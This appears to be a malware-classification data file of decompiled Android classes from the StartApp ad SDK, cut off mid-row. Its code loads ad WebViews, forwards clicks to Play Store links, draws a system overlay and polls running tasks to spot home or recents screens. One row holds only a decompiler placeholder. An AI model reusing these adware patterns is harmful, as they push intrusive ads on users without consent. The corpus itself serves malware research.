}       a();       this.c=true;     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       i.a(2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");       super.onReceivedError(webView,i,str,str2);     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       String lowerCase;       i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");       try {         this.a=str;         lowerCase=str.toLowerCase();       }  catch (      Exception e) {         i.a(6,""StartAppWall.UtilExcpetion - view to attached to window - Load Progress"");       }       if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com""))) {         return false;       }       this.b=true;       p.f();       p.b(this.g,str);       if (this.f != null) {         this.f.run();       }       return true;     }   }   public static int a(  Context context,  int i){     return (int)((context.getResources().getDisplayMetrics().density * i) + 0.5f);   }   public static String a(){     boolean z;     boolean z2;     Properties properties=null;     String str="""";     try {       properties=g();     }  catch (    Exception e) {       str=""0"";     }     if (str.compareTo(""0"") != 0) {       str=properties.getProperty(""inapp.version"");       if (str == null || """".equals(str)) {         str=""0"";       }       if (""${project.version}"".equals(str)) {         str=""0"";       }     }     try {       Class.forName(""com.apperhand.unity.wrapper.InAppWrapper"");       z=true;     }  catch (    ClassNotFoundException e2) {       z=false;     } catch (    Exception e3) {       z=true;     }     if (z) {       str=str + ""_Unity"";     }     try {       Class.forName(""org.apache.cordova.CordovaPlugin"");       z2=true;     }  catch (    ClassNotFoundException e4) {       z2=false;     } catch (    Exception e5) {       z2=true;     }     if (z2) {       str=str + ""_Cordova"";     }     i.a(3,""SDK version: ["" + str + ""]"");     return str;   }   public static String a(  String str,  String str2,  String str3){     int indexOf;     int indexOf2;     if (str == null || str2 == null || str3 == null || (indexOf=str.indexOf(str2)) == -1 || (indexOf2=str.indexOf(str3,str2.length() + indexOf)) == -1) {       return null;     }     return str.substring(str2.length() + indexOf,indexOf2);   }   public static String a(  Set<String> set){     StringBuilder sb=new StringBuilder(set.size());     Iterator<String> it=set.iterator();     while (it.hasNext()) {       sb.append(it.next()).append("","");     }     return sb.toString();   }   public static Set<String> a(  String str){     return new HashSet(Arrays.asList(str.split("","")));   }   public static Set<String> a(  JSONArray jSONArray,  Set<String> set){     if (jSONArray != null) {       set=new HashSet<>();       for (int i=0; i < jSONArray.length(); i++) {         try {           set.add(jSONArray.getString(i).intern());         }  catch (        JSONException e) {         }       }     }     return set;   }   public static void a(  Activity activity,  boolean z){     if (z) {       c.c(activity);     }  else {       activity.setRequestedOrientation(4);     }   }   public static void a(  Context context,  AdPreferences adPreferences){     String a2=g.a(context,""shared_prefs_devId"",(String)null);     String a3=g.a(context,""shared_prefs_appId"",(String)null);     if (adPreferences.getPublisherId() == null) {       if (a2 == null) {       }       adPreferences.setPublisherId(a2);     }     if (adPreferences.getProductId() == null) {       if (a3 == null) {       }       adPreferences.setProductId(a3);     }     if ((adPreferences.getProductId() == null || adPreferences.getPublisherId() == null) && !c) {       c=true;       Log.e(""StartApp"",""Integration Error - Developer ID and/or App ID is missing"");     }   }   public static void a(  final Context context,  final String str){     new AsyncTask<Void,Void,Void>(){       @Override public Void doInBackground(      Void... voidArr){         try {           com.startapp.android.publish.d.b.a(context,str,null);         }  catch (        n e) {         }         return null;       }     } .execute(new Void[0]);   }   public static final void a(  Context context,  String str,  int i){     a(context,str,i,(Runnable)null);   }   public static final void a(  Context context,  String str,  int i,  Runnable runnable){     if (context instanceof Activity) {       b=context;       a((Activity)context,true);     }     final WebView webView=new WebView(context);     a=ProgressDialog.show(context,null,""Loading...."",false,false,new DialogInterface.OnCancelListener(){       @Override public void onCancel(      DialogInterface dialogInterface){         webView.stopLoading();       }     } );     a.setCancelable(true);     webView.getSettings().setJavaScriptEnabled(true);     webView.setWebChromeClient(new WebChromeClient());     webView.setWebViewClient(new a(context,i,a,str,runnable));     webView.loadUrl(str);   }   public static void a(  Context context,  String str,  String str2){     g.b(context,""shared_prefs_devId"",str.trim());     g.b(context,""shared_prefs_appId"",str2.trim());   }   public static void a(  WebView webView,  String str){     try {       webView.loadDataWithBaseURL(""http://www.startappexchange.com"",str,""text/html"",""utf-8"",null);     }  catch (    Exception e) {       i.a(6,""StartAppWall.UtilError while encoding html"");     }   }   public static void a(  String str,  String str2,  String str3,  Context context){     a(context,str3);     Intent launchIntentForPackage=context.getPackageManager().getLaunchIntentForPackage(str);     if (str2 != null) {       try {         JSONObject jSONObject=new JSONObject(str2);         Iterator<String> keys=jSONObject.keys();         while (keys.hasNext()) {           String valueOf=String.valueOf(keys.next());           launchIntentForPackage.putExtra(valueOf,String.valueOf(jSONObject.get(valueOf)));         }       }  catch (      JSONException e) {         i.a(6,""Couldn't parse intent details json!"",e);       }     }     context.startActivity(launchIntentForPackage);   }   public static void a(  List<NameValueObject> list,  String str,  String str2,  boolean z){     if (z && str2 == null) {       throw new n(""Required key: ["" + str + ""] is missing"",null);     }     if (str2 != null) {       try {         NameValueObject nameValueObject=new NameValueObject();         nameValueObject.setName(str);         nameValueObject.setValue(URLEncoder.encode(str2,""UTF-8""));         list.add(nameValueObject);       }  catch (      UnsupportedEncodingException e) {         if (z) {           throw new n(""failed encoding value: ["" + str2 + ""]"",e);         }       }     }   }   public static void a(  List<NameValueObject> list,  String str,  Set<String> set,  boolean z){     if (z && set == null) {       throw new n(""Required key: ["" + str + ""] is missing"",null);     }     if (set != null) {       NameValueObject nameValueObject=new NameValueObject();       nameValueObject.setName(str);       HashSet hashSet=new HashSet();       Iterator<String> it=set.iterator();       while (it.hasNext()) {         try {           hashSet.add(URLEncoder.encode(it.next(),""UTF-8""));         }  catch (        UnsupportedEncodingException e) {         }       }       if (z && hashSet.size() == 0) {         throw new n(""failed encoding value: ["" + set + ""]"",null);       }       nameValueObject.setValueSet(hashSet);       list.add(nameValueObject);     }   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return activeNetworkInfo != null && activeNetworkInfo.isConnected();   }   public static int b(){     int i=-1;     try {       String property=g().getProperty(""inapp.sdk.id"");       if (property != null && !"""".equals(property) && !""${sdk.id}"".equals(-1)) {         try {           i=Integer.parseInt(property);         }  catch (        NumberFormatException e) {         }       }       i.a(3,""SDK ID: ["" + i + ""]"");     }  catch (    Exception e2) {       i.a(3,""Could not load properties, SDK ID set to: [-1]"");     }     return i;   }   public static void b(  Context context){     g.b(context,""shared_prefs_simple_token"",new Util().createToken(context));   }   public static void b(  Context context,  String str){     try {       Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));       intent.addFlags(344457216);       context.startActivity(intent);     }  catch (    Exception e) {       i.a(6,""Cannot find activity to load url:["" + str + ""]"");     }   }   public static String c(  Context context){     StringBuffer stringBuffer=new StringBuffer();     if (MetaData.INSTANCE.getAdInformationConfig(context).e().a(context)) {       stringBuffer.append(g.a(context,""shared_prefs_simple_token"",""""));     }     return stringBuffer.toString();   }   public static final void c(){     f();   }   public static boolean c(  Context context,  String str){     List<ActivityManager.RunningTaskInfo> runningTasks=((ActivityManager)context.getSystemService(""activity"")).getRunningTasks(Integer.MAX_VALUE);     if (runningTasks.size() > 0) {       String lowerCase=runningTasks.get(0).baseActivity.toShortString().toLowerCase();       if (lowerCase.contains(""com.android.internal.app.resolveractivity"")) {         return false;       }       if ((str != null && lowerCase.contains(str)) || lowerCase.contains(""com.android.internal.app"") || lowerCase.contains(""com.android.systemui.recent"")) {         return true;       }     }     return false;   }   public static String d(){     String str;     boolean z=false;     StackTraceElement[] stackTrace=new Throwable().getStackTrace();     int i=0;     while (true) {       if (i >= 8) {         str=""&position="";         break;       }       if (stackTrace[i].getMethodName().compareTo(""onPause"") == 0) {         str=""&position=home"";         z=true;         break;       }       if (stackTrace[i].getMethodName().compareTo(""onBackPressed"") == 0) {         str=""&position=back"";         z=true;         break;       }       i++;     }     return !z ? str + AdView.PLACEMENT_TYPE_INTERSTITIAL : str;   }   public static boolean d(  Context context,  String str){     String lowerCase;     int i;     ActivityManager activityManager=(ActivityManager)context.getSystemService(""activity"");     String packageName=context.getPackageName();     int i2=0;     while (true) {       if (i2 != 0) {         try {           Thread.sleep(100L);         }  catch (        InterruptedException e) {         }       }       lowerCase=activityManager.getRunningTasks(Integer.MAX_VALUE).get(0).baseActivity.toShortString().toLowerCase();       i.a(4,(i2 * 100) + "": "" + lowerCase);       i=i2 + 1;       if (!lowerCase.toLowerCase().contains(packageName.toLowerCase()) || i >= 10) {         break;       }       i2=i;     }     if (i == 1 || i == 10) {       return false;     }     if (lowerCase.contains(""com.android.internal.app.resolveractivity"")) {       return false;     }     return (str != null && lowerCase.contains(str)) || lowerCase.contains(""com.android.internal.app"") || lowerCase.contains(""com.android.systemui.recent"");   }   public static void f(){     if (b != null && (b instanceof Activity)) {       a((Activity)b,false);     }     if (a == null || !a.isShowing()) {       return;     }     a.cancel();     a=null;   }   private static Properties g(){     Properties properties=new Properties();     try {       properties.load(p.class.getClassLoader().getResourceAsStream(""startapp.properties""));     }  catch (    Exception e) {       properties.load(p.class.getClassLoader().getResourceAsStream(""assets/startapp.properties""));     }     return properties;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\a.code","public class a {   f d;   int e=0;   Hashtable<String,Bitmap> b=new Hashtable<>();   Set<String> c=new HashSet();   ConcurrentLinkedQueue<b> f=new ConcurrentLinkedQueue<>();   HashSet<String> a=new HashSet<>(); public class AsyncTaskC0056a extends AsyncTask<Void,Void,Bitmap> {     int a;     String b;     String c;     public AsyncTaskC0056a(    int i,    String str,    String str2){       this.a=-1;       this.a=i;       this.b=str;       this.c=str2;     }     @Override public Bitmap doInBackground(    Void... voidArr){       return com.startapp.android.publish.e.f.a(this.c);     }     @Override public void onPostExecute(    Bitmap bitmap){       a aVar=a.this;       aVar.e--;       if (bitmap != null) {         a.this.b.put(this.b,bitmap);         if (a.this.d != null) {           a.this.d.a(this.a);         }         a.this.b();       }     }   } public class b {     int a;     String b;     String c;     public b(    int i,    String str,    String str2){       this.a=i;       this.b=str;       this.c=str2;     }   }   public Bitmap a(  int i,  String str,  String str2){     Bitmap bitmap=this.b.get(str);     if (bitmap != null) {       return bitmap;     }     if (!this.c.contains(str)) {       this.c.add(str);       if (this.e >= 15) {         this.f.add(new b(i,str,str2));       }  else {         this.e++;         new AsyncTaskC0056a(i,str,str2).execute(new Void[0]);       }     }     return null;   }   public void a(){     this.c.clear();     this.e=0;     this.f.clear();     this.a.clear();   }   public void a(  final Context context,  String str,  final String str2){     if (this.a.contains(str2)) {       return;     }     this.a.add(str2);     new AsyncTask<Void,Void,Void>(){       @Override public Void doInBackground(      Void... voidArr){         try {           com.startapp.android.publish.d.b.a(context,str2,null);         }  catch (        n e) {         }         return null;       }     } .execute(new Void[0]);   }   public void a(  f fVar,  boolean z){     this.d=fVar;     if (z) {       a();     }   }   public void b(){     if (this.f.isEmpty()) {       return;     }     b poll=this.f.poll();     new AsyncTaskC0056a(poll.a,poll.b,poll.c).execute(new Void[0]);   } } public class a extends BroadcastReceiver {   private a(){   }   @Override public void onReceive(  Context context,  Intent intent){     i.a(2,""Dismiss3DBroadcastReceiver::onReceive - action = ["" + intent.getAction() + ""]"");     g.this.a();   } } private class a extends WebViewClient {   private String b;   private boolean c;   private boolean d;   private a(){     this.b="""";     this.c=false;     this.d=false;   }   private void a(){     new Thread(new Runnable(){       @Override public void run(){         try {           Thread.sleep(5000L);         }  catch (        InterruptedException e) {         }         if (a.this.c) {           return;         }         p.b(List3DActivity.this,a.this.b);         List3DActivity.this.finish();       }     } ).start();   }   @Override public void onPageFinished(  WebView webView,  String str){     i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");     super.onPageFinished(webView,str);   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");     super.onPageStarted(webView,str,bitmap);     if (this.d) {       return;     }     a();     this.d=true;   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     i.a(2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");     if (List3DActivity.this.b != null) {       List3DActivity.this.b.dismiss();     }     super.onReceivedError(webView,i,str,str2);   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");     this.b=str;     String lowerCase=str.toLowerCase();     if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com""))) {       return false;     }     this.c=true;     p.b(List3DActivity.this,str);     if (List3DActivity.this.b != null) {       List3DActivity.this.b.dismiss();     }     List3DActivity.this.finish();     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\AsyncTaskC0056a.code","public class AsyncTaskC0056a extends AsyncTask<Void,Void,Bitmap> {   int a;   String b;   String c;   public AsyncTaskC0056a(  int i,  String str,  String str2){     this.a=-1;     this.a=i;     this.b=str;     this.c=str2;   }   @Override public Bitmap doInBackground(  Void... voidArr){     return com.startapp.android.publish.e.f.a(this.c);   }   @Override public void onPostExecute(  Bitmap bitmap){     a aVar=a.this;     aVar.e--;     if (bitmap != null) {       a.this.b.put(this.b,bitmap);       if (a.this.d != null) {         a.this.d.a(this.a);       }       a.this.b();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\b.code","public class b {   int a;   String b;   String c;   public b(  int i,  String str,  String str2){     this.a=i;     this.b=str;     this.c=str2;   } } public class b extends ArrayAdapter<ListItem> {   public b(  Context context,  List<ListItem> list,  String str){     super(context,0,list);   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     d dVar;     if (view == null) {       d dVar2=new d(getContext());       view=dVar2.a();       dVar=dVar2;     }  else {       dVar=(d)view.getTag();     }     ListItem item=getItem(i);     dVar.a(MetaData.INSTANCE.getTemplate(getContext(),item.j()));     dVar.c().setText(item.d());     dVar.d().setText(item.e());     Bitmap a=e.INSTANCE.a(i,item.a(),item.f());     if (a == null) {       dVar.b().setImageResource(R.drawable.sym_def_app_icon);     }  else {       dVar.b().setImageBitmap(a);     }     dVar.e().setRating(item.h());     dVar.a(item.m());     e.INSTANCE.a(getContext(),item.a(),item.c());     return view;   } } private class b extends WebViewClient {   private int b;   public b(  int i){     this.b=i;   }   @Override public void onPageFinished(  WebView webView,  String str){     i.a(2,""MyWebView3DClient::onPageFinished - ["" + str + ""]"");     super.onPageFinished(webView,str);   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     i.a(2,""MyWebView3DClient::onPageStarted - ["" + str + ""]"");     super.onPageStarted(webView,str,bitmap);   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     i.a(2,""MyWebView3DClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");     g.this.a();     super.onReceivedError(webView,i,str,str2);   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     i.a(2,""MyWebView3DClient::shouldOverrideUrlLoading - ["" + str + ""]"");     String lowerCase=str.toLowerCase();     if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com""))) {       return false;     }     Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));     intent.addFlags(344457216);     g.this.getContext().startActivity(intent);     g.this.b(this.b);     i.a(3,g.d + ""Intent send: ["" + str+ ""], delay: [""+ this.b+ ""]"");     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3b013965"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\d.code","public class d {   private RelativeLayout a;   private ImageView b;   private TextView c;   private TextView d;   private TextView e;   private l f;   private MetaDataStyle g=null;   public d(  Context context){     context.setTheme(R.style.Theme);     ViewGroup.LayoutParams layoutParams=new ViewGroup.LayoutParams(-2,-2);     this.a=new RelativeLayout(context);     this.a.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{MetaData.INSTANCE.getItemGradientTop(context),MetaData.INSTANCE.getItemGradientBottom(context)}));     this.a.setLayoutParams(layoutParams);     int a=o.a(context,3);     int a2=o.a(context,4);     int a3=o.a(context,5);     int a4=o.a(context,6);     int a5=o.a(context,10);     int a6=o.a(context,84);     this.a.setPadding(a5,a,a5,a);     this.a.setTag(this);     this.b=new ImageView(context);     this.b.setId(1);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(a6,a6);     layoutParams2.addRule(15);     this.b.setLayoutParams(layoutParams2);     this.b.setPadding(0,0,a4,0);     this.c=new TextView(context);     this.c.setId(2);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-1,-2);     layoutParams3.addRule(1,1);     layoutParams3.addRule(6,1);     this.c.setLayoutParams(layoutParams3);     this.c.setPadding(0,0,0,a3);     this.c.setTextColor(MetaData.INSTANCE.getItemTitleTextColor(context).intValue());     this.c.setTextSize(MetaData.INSTANCE.getItemTitleTextSize(context).intValue());     this.c.setSingleLine(true);     this.c.setEllipsize(TextUtils.TruncateAt.END);     o.a(this.c,MetaData.INSTANCE.getItemTitleTextDecoration(context));     this.d=new TextView(context);     this.d.setId(3);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-1,-2);     layoutParams4.addRule(1,1);     layoutParams4.addRule(3,2);     layoutParams4.setMargins(0,0,0,a3);     this.d.setLayoutParams(layoutParams4);     this.d.setTextColor(MetaData.INSTANCE.getItemDescriptionTextColor(context).intValue());     this.d.setTextSize(MetaData.INSTANCE.getItemDescriptionTextSize(context).intValue());     this.d.setSingleLine(true);     this.d.setEllipsize(TextUtils.TruncateAt.END);     o.a(this.d,MetaData.INSTANCE.getItemDescriptionTextDecoration(context));     this.f=new l(context);     RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);     layoutParams5.addRule(1,1);     layoutParams5.addRule(8,1);     layoutParams5.setMargins(0,0,0,-a3);     this.f.setLayoutParams(layoutParams5);     this.f.setPadding(0,0,0,a2);     this.f.setId(5);     this.e=new TextView(context);     RelativeLayout.LayoutParams layoutParams6=new RelativeLayout.LayoutParams(-2,-2);     layoutParams6.addRule(11);     layoutParams6.addRule(8,1);     this.e.setLayoutParams(layoutParams6);     a(false);     this.e.setTextColor(-1);     this.e.setTextSize(12.0f);     this.e.setTypeface(null,1);     this.e.setPadding(a5,a4,a5,a4);     this.e.setId(4);     this.e.setShadowLayer(2.5f,-3.0f,3.0f,-9013642);     this.e.setBackgroundDrawable(new ShapeDrawable(new RoundRectShape(new float[]{10.0f,10.0f,10.0f,10.0f,10.0f,10.0f,10.0f,10.0f},null,null)){       @Override protected void onDraw(      Shape shape,      Canvas canvas,      Paint paint){         paint.setShader(new LinearGradient(0.0f,0.0f,shape.getWidth(),0.0f,-15626493,-15485690,Shader.TileMode.REPEAT));         paint.setMaskFilter(new EmbossMaskFilter(new float[]{1.0f,1.0f,1.0f},0.4f,5.0f,3.0f));         super.onDraw(shape,canvas,paint);       }     } );     this.a.addView(this.b);     this.a.addView(this.c);     this.a.addView(this.d);     this.a.addView(this.f);     this.a.addView(this.e);   }   public RelativeLayout a(){     return this.a;   }   public void a(  MetaDataStyle metaDataStyle){     if (this.g != metaDataStyle) {       this.g=metaDataStyle;       this.a.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{metaDataStyle.getItemGradientTop().intValue(),metaDataStyle.getItemGradientBottom().intValue()}));       this.c.setTextSize(metaDataStyle.getItemTitleTextSize().intValue());       this.c.setTextColor(metaDataStyle.getItemTitleTextColor().intValue());       o.a(this.c,metaDataStyle.getItemTitleTextDecoration());       this.d.setTextSize(metaDataStyle.getItemDescriptionTextSize().intValue());       this.d.setTextColor(metaDataStyle.getItemDescriptionTextColor().intValue());       o.a(this.d,metaDataStyle.getItemDescriptionTextDecoration());     }   }   public void a(  boolean z){     if (z) {       this.e.setText(""Open"");     }  else {       this.e.setText(""Download"");     }   }   public ImageView b(){     return this.b;   }   public TextView c(){     return this.c;   }   public TextView d(){     return this.d;   }   public l e(){     return this.f;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\Dynamics.code","public abstract class Dynamics implements Parcelable {   protected float a;   protected float b;   protected float c;   protected float d;   protected long e;   public Dynamics(){     this.c=Float.MAX_VALUE;     this.d=-3.4028235E38f;     this.e=0L;   }   public Dynamics(  Parcel parcel){     this.c=Float.MAX_VALUE;     this.d=-3.4028235E38f;     this.e=0L;     this.a=parcel.readFloat();     this.b=parcel.readFloat();     this.c=parcel.readFloat();     this.d=parcel.readFloat();     this.e=AnimationUtils.currentAnimationTimeMillis();   }   public float a(){     return this.a;   }   public void a(  double d){     this.a=(float)(this.a * d);   }   public void a(  float f){     this.c=f;   }   public void a(  float f,  float f2,  long j){     this.b=f2;     this.a=f;     this.e=j;   }   protected abstract void a(  int i);   public void a(  long j){     if (this.e != 0) {       int i=(int)(j - this.e);       a(i <= 50 ? i : 50);     }     this.e=j;   }   public boolean a(  float f,  float f2){     return ((Math.abs(this.b) > f ? 1 : (Math.abs(this.b) == f ? 0 : -1)) < 0) && (((this.a - f2) > this.c ? 1 : ((this.a - f2) == this.c ? 0 : -1)) < 0 && ((this.a + f2) > this.d ? 1 : ((this.a + f2) == this.d ? 0 : -1)) > 0);   }   public float b(){     return this.b;   }   public void b(  float f){     this.d=f;   }   public float c(){     if (this.a > this.c) {       return this.c - this.a;     }     if (this.a < this.d) {       return this.d - this.a;     }     return 0.0f;   }   @Override public int describeContents(){     return 0;   }   public String toString(){     return ""Position: ["" + this.a + ""], Velocity:[""+ this.b+ ""], MaxPos: [""+ this.c+ ""], mMinPos: [""+ this.d+ ""] LastTime:[""+ this.e+ ""]"";   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeFloat(this.a);     parcel.writeFloat(this.b);     parcel.writeFloat(this.c);     parcel.writeFloat(this.d);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\f.code","public interface f {   void a(  int i); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\g.code","public class g extends FrameLayout implements f {   protected WindowManager b;   ArrayList<ListItem> c;   private a e;   private c f;   private WebView g;   private View h;   private long i;   private c.a j;   private AdInformationOverrides k;   private static String d=""Overlay3D"";   public static boolean a=false; public class a extends BroadcastReceiver {     private a(){     }     @Override public void onReceive(    Context context,    Intent intent){       i.a(2,""Dismiss3DBroadcastReceiver::onReceive - action = ["" + intent.getAction() + ""]"");       g.this.a();     }   } private class b extends WebViewClient {     private int b;     public b(    int i){       this.b=i;     }     @Override public void onPageFinished(    WebView webView,    String str){       i.a(2,""MyWebView3DClient::onPageFinished - ["" + str + ""]"");       super.onPageFinished(webView,str);     }     @Override public void onPageStarted(    WebView webView,    String str,    Bitmap bitmap){       i.a(2,""MyWebView3DClient::onPageStarted - ["" + str + ""]"");       super.onPageStarted(webView,str,bitmap);     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       i.a(2,""MyWebView3DClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");       g.this.a();       super.onReceivedError(webView,i,str,str2);     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       i.a(2,""MyWebView3DClient::shouldOverrideUrlLoading - ["" + str + ""]"");       String lowerCase=str.toLowerCase();       if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com""))) {         return false;       }       Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));       intent.addFlags(344457216);       g.this.getContext().startActivity(intent);       g.this.b(this.b);       i.a(3,g.d + ""Intent send: ["" + str+ ""], delay: [""+ this.b+ ""]"");       return true;     }   }   public g(  Context context){     super(context);     this.e=new a();     this.g=null;     this.h=null;     this.i=System.currentTimeMillis();     this.k=AdInformationOverrides.a();     this.c=new ArrayList<>();     setBackgroundColor(0);     context.setTheme(R.style.Theme);     this.b=(WindowManager)getContext().getSystemService(""window"");     this.b.addView(this,getWmParams());     d();   }   private void a(  Context context,  LinearLayout linearLayout){     RelativeLayout relativeLayout=new RelativeLayout(context);     relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     relativeLayout.setBackgroundColor(MetaData.INSTANCE.getTitleBackgroundColor(context).intValue());     linearLayout.addView(relativeLayout);     TextView textView=new TextView(context);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(13);     textView.setLayoutParams(layoutParams);     textView.setPadding(0,o.a(context,2),0,o.a(context,5));     textView.setTextColor(MetaData.INSTANCE.getTitleTextColor(context).intValue());     textView.setTextSize(MetaData.INSTANCE.getTitleTextSize(context).intValue());     textView.setSingleLine(true);     textView.setEllipsize(TextUtils.TruncateAt.END);     textView.setText(MetaData.INSTANCE.getTitleContent(context));     textView.setShadowLayer(2.5f,-2.0f,2.0f,-11513776);     o.a(textView,MetaData.INSTANCE.getTitleTextDecoration(context));     relativeLayout.addView(textView);     ImageButton imageButton=new ImageButton(context,null,R.style.Theme.Translucent);     imageButton.setImageBitmap(Bitmap.createScaledBitmap(com.startapp.android.publish.e.d.a(context,""close_button.png""),o.a(context,36),o.a(context,36),true));     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(11);     layoutParams2.addRule(15);     imageButton.setLayoutParams(layoutParams2);     imageButton.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         g.this.a();       }     } );     relativeLayout.addView(imageButton);     View view=new View(context);     view.setLayoutParams(new LinearLayout.LayoutParams(-1,o.a(context,2)));     view.setBackgroundColor(MetaData.INSTANCE.getTitleLineColor(context).intValue());     linearLayout.addView(view);   }   private void d(){     removeAllViews();     WebView webView=new WebView(getContext());     webView.setBackgroundColor(-16777216);     webView.setOnKeyListener(new View.OnKeyListener(){       @Override public boolean onKey(      View view,      int i,      KeyEvent keyEvent){         g.this.a();         return true;       }     } );     addView(webView);     g();     e();   }   private void e(){     Context context=getContext();     RelativeLayout relativeLayout=new RelativeLayout(getContext());     ViewGroup.LayoutParams layoutParams=new FrameLayout.LayoutParams(-1,-1);     ViewGroup.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-1);     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setLayoutParams(layoutParams2);     linearLayout.setOrientation(1);     linearLayout.setBackgroundColor(-16777216);     relativeLayout.addView(linearLayout);     a(context,linearLayout);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,0);     layoutParams3.weight=1.0f;     this.f.setLayoutParams(layoutParams3);     linearLayout.addView(this.f);     LinearLayout linearLayout2=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,-2);     layoutParams4.gravity=80;     linearLayout2.setLayoutParams(layoutParams4);     linearLayout2.setBackgroundColor(MetaData.INSTANCE.getPoweredByBackgroundColor(context).intValue());     linearLayout2.setGravity(17);     linearLayout.addView(linearLayout2);     TextView textView=new TextView(context);     textView.setTextColor(MetaData.INSTANCE.getPoweredByTextColor(context).intValue());     textView.setPadding(0,o.a(context,2),0,o.a(context,5));     textView.setText(""Powered By "");     textView.setTextSize(16.0f);     linearLayout2.addView(textView);     ImageView imageView=new ImageView(context);     imageView.setImageBitmap(com.startapp.android.publish.e.d.a(context,""logo.png""));     linearLayout2.addView(imageView);     com.startapp.android.publish.adinformation.b bVar=new com.startapp.android.publish.adinformation.b(getContext(),b.EnumC0051b.LARGE,AdPreferences.Placement.INAPP_OFFER_WALL,this.k);     bVar.a(b.a.LAYOUT);     bVar.a(relativeLayout);     addView(relativeLayout,layoutParams);   }   public int f(){     long currentTimeMillis=System.currentTimeMillis() - this.i;     if (currentTimeMillis < 5000) {       return 5000 - ((int)currentTimeMillis);     }     return 0;   }   private void g(){     int backgroundGradientTop=MetaData.INSTANCE.getBackgroundGradientTop(getContext());     int backgroundGradientBottom=MetaData.INSTANCE.getBackgroundGradientBottom(getContext());     this.f=new c(getContext(),null);     this.f.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{backgroundGradientTop,backgroundGradientBottom}));     final List<ListItem> b2=e.INSTANCE.b();     if (b2 == null) {       b(0);       return;     }     for (int i=0; i < b2.size(); i++) {       this.c.add(b2.get(i));     }     this.f.setHint(true);     this.f.setFade(true);     com.startapp.android.publish.list3d.b bVar=new com.startapp.android.publish.list3d.b(getContext(),b2,""home"");     e.INSTANCE.a(this,true);     this.f.setAdapter(bVar);     this.f.setDynamics(new SimpleDynamics(0.9f,0.6f));     this.f.setFocusable(true);     this.f.setSelected(true);     this.f.setOnKeyListener(new View.OnKeyListener(){       @Override public boolean onKey(      View view,      int i2,      KeyEvent keyEvent){         g.this.a();         return true;       }     } );     this.f.setOnItemClickListener(new 